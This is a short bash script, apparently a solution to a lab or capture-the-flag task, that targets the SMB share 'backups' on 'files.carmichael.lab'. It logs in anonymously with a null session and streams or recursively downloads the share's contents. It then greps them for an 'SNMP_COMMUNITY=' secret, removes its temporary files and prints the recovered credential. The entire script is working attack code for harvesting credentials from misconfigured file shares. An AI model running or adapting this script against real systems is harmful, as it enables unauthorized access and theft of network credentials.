#!/bin/bash

TARGET="files.carmichael.lab"
SHARE="backups"

# Strategy A: Stream file contents into memory via tar and search for the key.
# This prevents downloading arbitrary files to your local workspace.
SECRET=$(smbclient -N -U "" "//$TARGET/$SHARE" -c "tar c -" 2>/dev/null | strings | grep 'SNMP_COMMUNITY=' | tr -d '\r' | head -n 1)

# Strategy B: Fallback to writing files to a temporary directory if memory streaming fails.
if [ -z "$SECRET" ]; then
    TMP_DIR=$(mktemp -d)
    
    # Enter the isolated temp directory
    cd "$TMP_DIR" || exit 1
    
    # Try downloading with smbclient first
    smbclient -N -U "" "//$TARGET/$SHARE" -c "prompt OFF; recurse ON; mget *" >/dev/null 2>&1
    
    # Try downloading with smbget as a fallback
    smbget -a -q -R "smb://$TARGET/$SHARE" >/dev/null 2>&1
    
    # Recursively grep the files for the configuration secret and strip Windows carriage returns
    SECRET=$(grep -hr "SNMP_COMMUNITY=" . 2>/dev/null | tr -d '\r' | head -n 1)
    
    # Cleanup and exit temp directory
    cd - >/dev/null
    rm -rf "$TMP_DIR"
fi

# Output exactly one non-empty line
echo "$SECRET"
